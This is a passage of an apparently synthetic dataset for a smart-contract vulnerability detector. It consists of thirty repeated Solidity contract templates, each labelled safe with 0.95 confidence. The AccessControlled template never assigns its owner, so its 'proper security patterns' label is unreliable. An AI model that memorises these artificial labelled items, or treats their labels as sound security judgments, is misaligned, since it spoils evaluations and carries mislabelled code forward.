    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 212",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 213",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 214",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 215",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 216",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 217",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 218",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 219",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 220",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 221",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 222",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 223",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 224",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 225",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 226",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 227",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 228",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 229",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 230",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 231",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 232",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 233",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 234",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 235",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 236",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 237",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 238",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 239",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 240",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 241",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
